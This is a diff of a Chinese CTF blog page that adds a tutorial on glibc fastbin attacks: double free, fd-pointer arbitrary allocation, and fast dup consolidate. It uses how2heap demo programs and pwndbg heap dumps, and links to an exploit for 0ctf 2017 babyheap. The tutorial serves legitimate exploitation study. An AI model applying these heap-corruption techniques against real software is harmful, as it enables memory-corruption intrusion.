@@ -77,7 +77,7 @@ document.addEventListener('DOMContentLoaded', function(event) {
   }
 
   function addBadge(block) {
-    var enabled = ('true' || 'true').toLowerCase();
+    var enabled = ('false' || 'true').toLowerCase();
     if (enabled == 'true') {
       var pre = block.parentElement;
       pre.classList.add('badge');
@@ -102,7 +102,7 @@ document.addEventListener('DOMContentLoaded', function(event) {
   pre.badge::before {
     content: attr(data-lang);
     color: #fff;
-    background-color: #004e00;
+    background-color: #ff4e00;
     padding: 0 .5em;
     border-radius: 0 2px;
     text-transform: uppercase;
@@ -535,7 +535,7 @@ document.addEventListener('DOMContentLoaded', function(event) {
 
 
 
-    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 1 min</span>
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 32 mins</span>
   </p><div class="post-tags"><a class="post-tag" href="/tags.html#heap">#heap</a><a class="post-tag" href="/tags.html#srand">#srand</a></div></header>
 </div>
     </div>
@@ -712,13 +712,364 @@ document.addEventListener('DOMContentLoaded', function(event) {
 
       <h2 id="介绍">介绍</h2>
 
+<p><code class="language-plaintext highlighter-rouge">fastbin attack</code> 是指所有基于 <code class="language-plaintext highlighter-rouge">fastbin</code> 机制的漏洞利用方法。这类利用的前提是：</p>
+
+<ul>
+  <li>存在<code class="language-plaintext highlighter-rouge">堆溢出</code>、<code class="language-plaintext highlighter-rouge">use-after-free</code> 等能控制 chunk 内容的漏洞</li>
+  <li>漏洞发生于 fastbin 类型的 chunk 中</li>
+</ul>
+
+<p>fastbin attack 具体有以下几个分类：</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Fastbin Double Free</code></li>
+  <li><code class="language-plaintext highlighter-rouge">House of Spirit</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Arbitrary Alloc</code></li>
+</ul>
+
+<p>其中，前两种主要漏洞侧重于利用 free 函数释放真的 chunk 或伪造的 chunk，然后再次申请 chunk 进行攻击，第三种侧重于故意修改 <strong><code class="language-plaintext highlighter-rouge">fd</code></strong> 指针，直接利用 <strong>malloc</strong> 申请指定位置 chunk 进行攻击。</p>
+
+<h2 id="原理">原理</h2>
+
+<p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。</p>
+
 <h2 id="fastbin-double-free">Fastbin Double Free</h2>
 
-<h2 id="house-of-spirit">House Of Spirit</h2>
+<p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。其效果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块。</p>
+
+<p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
+
+<ul>
+  <li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空, 因此不会释放完就合并</li>
+  <li>fastbin 在执行 free(实际是<code class="language-plaintext highlighter-rouge">_int_free</code>) 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">_int_free</code> 中对 fastbin double free 的检查</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Another simple check: make sure the top of the bin is not the
+       record we are going to add (i.e., double free).  */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">old</span> <span class="o">==</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+      <span class="p">{</span>
+        <span class="n">errstr</span> <span class="o">=</span> <span class="s">"double free or corruption (fasttop)"</span><span class="p">;</span>
+        <span class="k">goto</span> <span class="n">errout</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>这里直接拿<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup.c">how2heap</a>上的实例来分析</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;assert.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"This file demonstrates a simple double-free attack with fastbins.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Allocating 3 buffers.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="o">*</span><span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="o">*</span><span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"1st malloc(8): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"2nd malloc(8): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"3rd malloc(8): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
+
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Freeing the first one...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
+
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"If we free %p again, things will crash because %p is at the top of the free list.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+  <span class="c1">// free(a);</span>
+
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"So, instead, we'll free %p.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
+  <span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
+
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Now, we can free %p again, since it's not the head of the free list.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+  <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
+
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+  <span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+  <span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+  <span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"1st malloc(8): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"2nd malloc(8): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
+  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"3rd malloc(8): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
+
+  <span class="n">assert</span><span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="n">c</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>首先执行 malloc(8) 申请得到三个大小为 0x20 的堆块</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int *a = malloc(8);
+int *b = malloc(8);
+int *c = malloc(8);
+
+Allocating 3 buffers.
+1st malloc(8): 0x405010
+2nd malloc(8): 0x405030
+3rd malloc(8): 0x405050
+
+0x405000:       0x0000000000000000      0x0000000000000021    ----&gt; chunk 0
+0x405010:       0x0000000000000000      0x0000000000000000    
+0x405020:       0x0000000000000000      0x0000000000000021    ----&gt; chunk 1
+0x405030:       0x0000000000000000      0x0000000000000000
+0x405040:       0x0000000000000000      0x0000000000000021    ----&gt; chunk 2
+0x405050:       0x0000000000000000      0x0000000000000000
+0x405060:       0x0000000000000000      0x0000000000020fa1    ----&gt; top chunk
+</code></pre></div></div>
+
+<p>释放 chunk 0</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fprintf(stderr, "Freeing the first one...\n");
+free(a);
+
+Freeing the first one...
+
+pwndbg&gt; fastbin
+fastbins
+0x20: 0x405000 ◂— 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+</code></pre></div></div>
+
+<p>如果我们直接再次释放 chunk 0, _int_free 会报错，原因之前也提到了是因为 _int_free 有一个对 bin 头部的简单检查</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Freeing the first one...
+If we free 0x7c4010 again, things will crash because 0x7c4010 is at the top of the free list.
+*** Error in `./fir_err': double free or corruption (fasttop): 0x00000000007c4010 ***
+======= Backtrace: =========
+/glibc/buuoj-libc/2.23-amd64/libc.so.6(+0x777e5)[0x7f07f2c8e7e5]
+/glibc/buuoj-libc/2.23-amd64/libc.so.6(+0x8037a)[0x7f07f2c9737a]
+/glibc/buuoj-libc/2.23-amd64/libc.so.6(cfree+0x4c)[0x7f07f2c9b53c]
+./fir_err[0x4012e4]
+/glibc/buuoj-libc/2.23-amd64/libc.so.6(__libc_start_main+0xf0)[0x7f07f2c37830]
+./fir_err[0x4010fe]
+</code></pre></div></div>
+
+<p>但是如果我们再释放一个同样大小的 fastbin chunk，就能改变 bin 头部记录的chunk 指针，从而绕过这个检查</p>
+
+<p>继续执行，释放 chunk 1</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
+// free(a);
+fprintf(stderr, "So, instead, we'll free %p.\n", b);
+free(b);
+
+If we free 0x405010 again, things will crash because 0x405010 is at the top of the free list.
+So, instead, we'll free 0x405030.
+
+pwndbg&gt; fastbin
+fastbins
+0x20: 0x405020 —▸ 0x405000 ◂— 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+pwndbg&gt; heap
+Free chunk (fastbins) | PREV_INUSE
+Addr: 0x405000
+Size: 0x21
+fd: 0x00
+
+Free chunk (fastbins) | PREV_INUSE
+Addr: 0x405020
+Size: 0x21
+fd: 0x405000
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405040
+Size: 0x21
+
+Top chunk | PREV_INUSE
+Addr: 0x405060
+Size: 0x20fa1
+
+pwndbg&gt;
+</code></pre></div></div>
+
+<p>再次释放 chunk 0，double free</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
+free(a);
+
+Now, we can free 0x405010 again, since it's not the head of the free list.
+
+pwndbg&gt; fastbins
+fastbins
+0x20: 0x405000 —▸ 0x405020 ◂— 0x405000
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+pwndbg&gt; x/20gx 0x405000
+0x405000:       0x0000000000000000      0x0000000000000021    ----&gt; chunk 0
+0x405010:       0x0000000000405020      0x0000000000000000    ----&gt; fd = 0x405020
+0x405020:       0x0000000000000000      0x0000000000000021    ----&gt; chunk 1
+0x405030:       0x0000000000405000      0x0000000000000000    ----&gt; fd = 0x405000
+0x405040:       0x0000000000000000      0x0000000000000021    ----&gt; chunk 2
+0x405050:       0x0000000000000000      0x0000000000000000
+0x405060:       0x0000000000000000      0x0000000000020fa1    ----&gt; top chunk
+</code></pre></div></div>
+
+<p>执行三次 malloc, 从 fastbin 上申请 chunk，现在 指针 <code class="language-plaintext highlighter-rouge">a</code> 和 <code class="language-plaintext highlighter-rouge">c</code> 指向的已经是同一个堆块了</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
+a = malloc(8);
+b = malloc(8);
+c = malloc(8);
+fprintf(stderr, "1st malloc(8): %p\n", a);
+fprintf(stderr, "2nd malloc(8): %p\n", b);
+fprintf(stderr, "3rd malloc(8): %p\n", c);
+
+Now the free list has [ 0x405010, 0x405030, 0x405010 ]. If we malloc 3 times, we'll get 0x405010 twice!
+1st malloc(8): 0x405010
+2nd malloc(8): 0x405030
+3rd malloc(8): 0x405010
+</code></pre></div></div>
+
+<p>需要注意的是，我们通过 malloc 函数申请 fast bin chunk 时，<code class="language-plaintext highlighter-rouge">_int_malloc</code> 会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*(a-2) = 0x41;
+c = malloc(8);
+
+pwndbg&gt; x/20gx 0x405000
+0x405000:       0x0000000000000000      0x0000000000000041    ----&gt; change size to 0x41
+0x405010:       0x0000000000405020      0x0000000000000000
+0x405020:       0x0000000000000000      0x0000000000000021
+0x405030:       0x0000000000405000      0x0000000000000000
+0x405040:       0x0000000000000000      0x0000000000000021
+0x405050:       0x0000000000000000      0x0000000000000000
+0x405060:       0x0000000000000000      0x0000000000020fa1
+pwndbg&gt; fastbins
+fastbins
+0x20: 0x405020 —▸ 0x405000 ◂— 0x405020 /* ' P@' */
+0x30: 0x0
+0x40: 0x0
+
+*** Error in `/home/hyh/Desktop/buuoj/fastbin/fir_err': malloc(): memory corruption (fast): 0x0000000000405010 ***
+======= Backtrace: =========
+/glibc/buuoj-libc/2.23-amd64/libc.so.6(+0x777e5)[0x7ffff7a847e5]
+/glibc/buuoj-libc/2.23-amd64/libc.so.6(+0x82651)[0x7ffff7a8f651]
+/glibc/buuoj-libc/2.23-amd64/libc.so.6(__libc_malloc+0x54)[0x7ffff7a91184]
+/home/hyh/Desktop/buuoj/fastbin/fir_err[0x401393]
+/glibc/buuoj-libc/2.23-amd64/libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d830]
+/home/hyh/Desktop/buuoj/fastbin/fir_err[0x4010fe]
+</code></pre></div></div>
+
+<p>对应的<code class="language-plaintext highlighter-rouge">_int_malloc</code>检查如下</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">fastbin_index</span> <span class="p">(</span><span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">))</span> <span class="o">!=</span> <span class="n">idx</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="n">errstr</span> <span class="o">=</span> <span class="s">"malloc(): memory corruption (fast)"</span><span class="p">;</span>
+    <span class="nl">errout:</span>
+      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span> <span class="n">errstr</span><span class="p">,</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">));</span>
+      <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="效果">效果</h3>
+
+<p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域。
+如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过<code class="language-plaintext highlighter-rouge">_int_malloc</code>验证)，这就相当于任意地址写任意值的效果。</p>
 
 <h2 id="arbitrary-alloc">Arbitrary Alloc</h2>
 
+<p><strong>关键</strong>：任意地址写的本质也是由于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。</p>
+
+<p>该技术的核心点在于</p>
+<ul>
+  <li>目标地址 size 域合法，这个 size 域是构造的，还是本身存在的都无妨</li>
+  <li><strong>劫持</strong> fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配任意地址，从而实现泄露或控制该地址的一些关键数据，如<code class="language-plaintext highlighter-rouge">__malloc_hook</code>。</li>
+</ul>
+
+<p>只要满足目标地址存在合法的 size，我们就可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fprintf(stderr, "Now we change the fd at the top of free list!\n");
+*a = *a - 0x20;
+fprintf(stderr, "Now we can get the chunk at %p forever !\n", a);
+fprintf(stderr, "1st malloc(8): %p\n", malloc(8));
+fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
+fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));
+
+Now we change the fd at the top of free list!
+Now we can get the chunk at 0x405010 forever !
+1st malloc(8): 0x405010
+2nd malloc(8): 0x405010
+3rd malloc(8): 0x405010
+
+pwndbg&gt; fastbins
+fastbins
+0x20: 0x405000 ◂— 0x405000
+0x30: 0x0
+pwndbg&gt; x/20gx 0x405000
+0x405000:       0x0000000000000000      0x0000000000000021
+0x405010:       0x0000000000405000      0x0000000000000000
+0x405020:       0x0000000000000000      0x0000000000000021
+0x405030:       0x0000000000405000      0x0000000000000000
+0x405040:       0x0000000000000000      0x0000000000000021
+0x405050:       0x0000000000000000      0x0000000000000000
+0x405060:       0x0000000000000000      0x0000000000020fa1
+</code></pre></div></div>
+
 <h2 id="2017-0ctf-babyheap">2017 0ctf babyheap</h2>
+
+<p><a href="https://github.com/huyinhao/ctf-buuoj/blob/main/fastbin/babyheap_0ctf_2017/exp.py">利用</a></p>
+
+<h2 id="fast-dup-consolidate">Fast Dup Consolidate</h2>
+
+<p><strong>待补充!!</strong></p>
+
+<p>当分配 large chunk时， _int_malloc 会调用 malloc_consolidate 尝试将空闲的 fastbin chunk 进行合并，来提高内存的利用率，减少内存碎片化的问题。</p>
+
+<p>这些 fastbin chunk 会被合并到 unsorted bin 或者 top chunk，此时 fastbin 数组头部为空，即使再次 free 某个 fast bin chunk 时也不会触发 _int_free 检测，造成 double free 。</p>
+
+<p>malloc_consolidate 大致可以分为以下几步：</p>
+<ol>
+  <li>若 get_max_fast() 返回 0，则进行堆的初始化工作，然后进入第 7 步</li>
+  <li>从 fastbin 中获取一个空闲 chunk</li>
+  <li>尝试向后合并</li>
+  <li>若向前相邻 top_chunk，则直接合并到 top_chunk，然后进入第 6 步</li>
+  <li>否则尝试向前合并后，插入到 unsorted_bin 中</li>
+  <li>获取下一个空闲 chunk，回到第 2 步，直到所有 fastbin 清空后进入第 7 步</li>
+  <li>退出函数</li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;assert.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="c1">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">"This is a powerful technique that bypasses the double free check in tcachebin."</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Fill up the tcache list to force the fastbin usage...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+	<span class="kt">void</span><span class="o">*</span> <span class="n">p1</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x40</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Allocate another chunk of the same size p1=%p </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p1</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Freeing p1 will add this chunk to the fastbin list...</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>
+
+	<span class="kt">void</span><span class="o">*</span> <span class="n">p3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Allocating a tcache-sized chunk (p3=%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p3</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"will trigger the malloc_consolidate and merge</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"the fastbin chunks into the top chunk, thus</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"p1 and p3 are now pointing to the same chunk !</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+	<span class="n">assert</span><span class="p">(</span><span class="n">p1</span> <span class="o">==</span> <span class="n">p3</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Triggering the double free vulnerability!</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>
+
+	<span class="kt">void</span> <span class="o">*</span><span class="n">p4</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span>
+
+	<span class="n">assert</span><span class="p">(</span><span class="n">p4</span> <span class="o">==</span> <span class="n">p3</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"The double free added the chunk referenced by p1 </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"to the tcache thus the next similar-size malloc will</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"point to p3: p3=%p, p4=%p</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span><span class="n">p3</span><span class="p">,</span> <span class="n">p4</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
 
 <h2 id="reference">Reference</h2>
 
@@ -737,7 +1088,7 @@ document.addEventListener('DOMContentLoaded', function(event) {
 <div class="post-nav"><a class="previous" href="/wp/2022/04/06/%E8%99%8E%E7%AC%A6-2022-babygame-WP.html" title="虎符 2022 babygame WP">虎符 2022 babygame WP</a><a class="next" href="/notes/2022/04/15/Glibc-%E5%A0%86%E6%A6%82%E8%BF%B0.html" title="GLIBC 堆概述">GLIBC 堆概述</a></div><div class="post-related">
       <div>Related Articles</div>
       <ul>
-        <li><a class="post-link" href="/wp/2022/03/28/chunk-overlapping-%E6%80%BB%E7%BB%93.html" title="GLIBC 堆概述">Chunk overlapping 总结</a></li><li><a class="post-link" href="/wp/2022/04/06/%E8%99%8E%E7%AC%A6-2022-babygame-WP.html" title="GLIBC 堆概述">虎符 2022 babygame WP</a></li><li><a class="post-link" href="/wp/2022/03/27/2022DASCTF-X-SU-checkin.html" title="GLIBC 堆概述">2022DASCTF X SU checkin</a></li><li><a class="post-link" href="/wp/2022/03/27/Picoctf_2022-Write-Up.html" title="GLIBC 堆概述">Picoctf_2022 Write-Up</a></li></ul>
+        <li><a class="post-link" href="/wp/2022/03/27/2022DASCTF-X-SU-checkin.html" title="GLIBC 堆概述">2022DASCTF X SU checkin</a></li><li><a class="post-link" href="/wp/2022/03/27/Picoctf_2022-Write-Up.html" title="GLIBC 堆概述">Picoctf_2022 Write-Up</a></li><li><a class="post-link" href="/wp/2022/03/28/chunk-overlapping-%E6%80%BB%E7%BB%93.html" title="GLIBC 堆概述">Chunk overlapping 总结</a></li><li><a class="post-link" href="/notes/2022/04/15/Glibc-%E5%A0%86%E6%A6%82%E8%BF%B0.html" title="GLIBC 堆概述">GLIBC 堆概述</a></li></ul>
     </div><div class="post-comments"></div></section>
 </div>
 
